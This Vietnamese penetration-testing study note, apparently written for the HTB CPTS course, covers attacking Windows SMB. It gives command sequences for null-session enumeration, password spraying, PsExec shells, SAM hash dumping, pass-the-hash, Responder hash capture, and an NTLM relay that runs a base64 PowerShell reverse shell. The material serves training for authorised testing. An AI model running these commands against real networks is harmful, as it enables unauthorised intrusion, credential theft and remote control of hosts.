---
title: "Attacking SMB"
date: 2026-04-19 09:00:00 +0700
categories: [HTB_CPTS, Exploitation]
tags: [smb, exploitation, windows, active-directory]
description: "HTB CPTS note về SMB enumeration, shares, relay và exploitation."
pin: false
---
**Port:** 445 (SMB direct) / 139 (SMB qua NetBIOS) **Bản chất:** Giao thức chia sẻ file, máy in, tài nguyên mạng của Windows. Cực kỳ phổ biến trong môi trường AD — mục tiêu ưu tiên trong pentest nội bộ. **Samba** = triển khai SMB trên Linux/Unix, cho phép Linux và Windows giao tiếp qua cùng giao thức.

---
## Điểm Yếu Cốt Lõi

|Điểm yếu|Mô tả|
|---|---|
|**Null session**|Cấu hình cũ cho phép kết nối ẩn danh → enum user/group/policy|
|**Misconfigured shares**|Share có quyền READ/WRITE không cần xác thực|
|**Weak credentials**|Brute force hoặc password spray|
|**SMB Signing disabled**|Điều kiện để NTLM Relay hoạt động|
|**NTLM Relay**|Capture và relay NTLM hash sang target khác|
|**Pass-the-Hash**|Dùng NTLM hash thay plaintext password|
|**SMBv1 enabled**|Dễ bị EternalBlue (MS17-010)|

---
## ☠️ Dangerous Settings (smb.conf)

|Setting|Nguy hiểm vì|
|---|---|
|`guest ok = yes`|Kết nối không cần mật khẩu|
|`read only = no`|Cho phép ghi file vào share|
|`browseable = yes`|Attacker thấy được nội dung share|
|`create mask = 0777`|File tạo mới có full permission|
|`logon script = script.sh`|Script chạy khi user login → RCE tiềm năng|
|`map to guest = bad user`|User không tồn tại → tự động thành guest|
|`smb1 enabled = yes`|SMBv1 có lỗ hổng EternalBlue (MS17-010)|

---
## Enumeration

```bash
# Nmap scan
sudo nmap <IP> -sV -sC -p139,445

# Kiểm tra lỗ hổng SMB
nmap -p 445 --script smb-vuln-* <IP>

# Null session — liệt kê shares
smbclient -N -L //<IP>
```

## Exploitation
``` bash
# Kết nối vào share cụ thể với null session
smbclient //<IP>/<SHARE> -N
# Kết nối vào share cụ thể với username-password
smbclient //<IP>/<SHARE> -U <USER>%'<PASSWORD>'

# Liệt kê shares và quyền truy cập
smbmap -H <IP>
smbmap -H <IP> -u <USER> -p <PASSWORD>

# Duyệt đệ quy vào share
smbmap -H <IP> -r <SHARE>

# Download / Upload file
smbmap -H <IP> --download "<SHARE>\<FILE>"
smbmap -H <IP> --upload <LOCAL_FILE> "<SHARE>\<REMOTE_FILE>"

# Null session với rpcclient
rpcclient -U'%' <IP>

# Null session với rpcclient để recon workstation hoặc Domain Controller.
rpcclient $> enumdomusers

# Tự động enum toàn bộ
enum4linux-ng <IP> -A -C

# CrackMapExec null session
crackmapexec smb <IP> --shares -u '' -p ''

# Duyệt đệ quy vào share
smbmap -H <IP> -r <SHARE>

# Download / Upload file
smbmap -H <IP> --download "<SHARE>\<FILE>"
smbmap -H <IP> --upload <LOCAL_FILE> "<SHARE>\<REMOTE_FILE>"

# Null session với rpcclient
rpcclient -U'%' <IP>

# Null session với rpcclient để recon workstation hoặc Domain Controller.
rpcclient $> enumdomusers

# Tự động enum toàn bộ
enum4linux-ng <IP> -A -C

# CrackMapExec null session
crackmapexec smb <IP> --shares -u '' -p ''
```

### Lệnh Hữu Ích Trong rpcclient

|Lệnh|Mô tả|
|---|---|
|`srvinfo`|Thông tin server|
|`enumdomusers`|Liệt kê users + RID|
|`enumdomgroups`|Liệt kê domain groups|
|`querydominfo`|Thông tin domain|
|`getdompwinfo`|Password policy|
|`queryuser <RID>`|Chi tiết user theo RID (vd: `0x1f4`)|
|`netshareenumall`|Liệt kê toàn bộ shares + path thực|
|`netsharegetinfo <SHARE>`|Chi tiết share cụ thể|

---
## Authentication & Brute Force

**Password Spray** (ưu tiên hơn brute force — tránh lock account):

- 1 password thử với nhiều user
- Nếu biết threshold: thử 2-3 password, chờ 30-60 phút giữa các lần

```bash
# Password spraying
crackmapexec smb <IP> -u <USERLIST> -p '<PASSWORD>' --local-auth
netexec smb <ip> -u <user> -p <file_pwd>
# --local-auth          : dùng khi target không join domain
# --continue-on-success : tiếp tục dù đã tìm được creds
```

---
## Remote Code Execution (RCE)

**Bản chất PsExec:** Upload một Windows service lên share `ADMIN$` → dùng DCE/RPC gọi Service Control Manager → khởi động service → tạo named pipe → gửi lệnh qua pipe → nhận shell với quyền `SYSTEM`.

```bash
# impacket-psexec — mở interactive shell
impacket-psexec <USER>:'<PASSWORD>'@<IP>

# CrackMapExec — thực thi lệnh (hỗ trợ nhiều host cùng lúc)
crackmapexec smb <IP> -u <USER> -p '<PASSWORD>' -x '<CMD>' --exec-method smbexec
# -x  : lệnh CMD
# -X  : lệnh PowerShell
# Nếu không chỉ định --exec-method, CME thử atexec trước → fail thì dùng smbexec

# Liệt kê user đang đăng nhập trên toàn subnet
crackmapexec smb <SUBNET>/24 -u <USER> -p '<PASSWORD>' --loggedon-users
```

---
## Credential Dumping

**SAM Database** = file lưu NTLM hash của tất cả local user trên Windows.

```bash
# Dump SAM database
crackmapexec smb <IP> -u <USER> -p '<PASSWORD>' --sam
```

Output dạng: `username:RID:LMhash:NThash:::` Sau khi có hash → crack hoặc Pass-the-Hash.

---

## Pass-the-Hash (PtH)

**Bản chất:** NTLM authentication hoạt động bằng cách gửi hash — không bao giờ gửi plaintext. Có hash = có thể xác thực hoàn toàn, không cần crack.

```bash
# PtH với CrackMapExec — kiểm tra trên nhiều host
crackmapexec smb <IP> -u <USER> -H <NTHASH>

# PtH với impacket-psexec — mở shell
impacket-psexec <USER>@<IP> -hashes :<NTHASH>
# Chỉ cần NT hash (phần sau dấu :), LM hash để trống
```

---
## Forced Authentication — Bắt Hash Qua Mạng

**Bản chất:** Windows dùng LLMNR/NBT-NS để broadcast khi DNS không resolve được hostname. Không ai verify câu trả lời → Responder giả vờ là server → victim tự gửi NetNTLMv2 hash để authenticate.

```
Victim gõ sai: \\<WRONG_HOSTNAME>\
→ DNS không resolve → broadcast LLMNR ra toàn mạng
→ Responder trả lời: "Tôi là \\<WRONG_HOSTNAME>!"
→ Victim gửi NetNTLMv2 hash
→ Ta capture được hash
```

```bash
sudo responder -I <INTERFACE>
# Hash được lưu tại: /usr/share/responder/logs/
```

> **Lưu ý:** NetNTLMv2 có salt ngẫu nhiên — mỗi lần capture sẽ ra hash khác nhau dù cùng password. Đây là đặc tính thiết kế, không phải lỗi.

```bash
# Crack hash bắt được
hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
# -m 5600 = NetNTLMv2
```

---
## NTLM Relay Attack

**Bản chất:** Thay vì crack hash, ta **relay** (chuyển tiếp) NTLM auth request từ victim sang target khác → xác thực thay victim → dump SAM hoặc thực thi lệnh. **Điều kiện bắt buộc:** SMB Signing phải **disabled** trên target.

```bash
# Bước 0 — Tìm host có SMB Signing disabled
crackmapexec smb <SUBNET>/24 --gen-relay-list targets.txt

# Bước 1 — Tắt SMB server của Responder
# Sửa /etc/responder/Responder.conf → SMB = Off

# Bước 2 — Chạy ntlmrelayx nhắm vào target
# Relay để dump SAM (mặc định)
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>

# Relay để thực thi reverse shell
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> \
    -c 'powershell -e <BASE64_REVERSE_SHELL>'

# Bước 3 — Kích hoạt victim gửi NTLM request
# (Responder, Printer Bug, v.v.)
# → ntlmrelayx tự động relay và thực thi
```

**Flow đầy đủ:**

1. Xác nhận SMB Signing disabled trên target
2. Tắt SMB của Responder (`SMB = Off`)
3. Bật `impacket-ntlmrelayx` chờ kết nối
4. Kích hoạt victim gửi NTLM request (Responder, Printer Bug, v.v.)
5. ntlmrelayx relay tới target → dump SAM hoặc thực thi lệnh

---
## Attack Flow Tổng Quát

```
SMB Target
├── Null session?
│   YES → enum shares / users / RPC
│   NO  → Brute force / Password spray
│
├── Got credentials?
│   → impacket-psexec / smbexec (RCE)
│   → --sam (dump hashes)
│   → Pass-the-Hash
│
└── Trên LAN (không cần creds)
    → Responder (bắt NetNTLMv2)
        ├── Crack → plaintext password
        └── Relay → SAM dump / reverse shell
            (yêu cầu SMB Signing disabled)
```
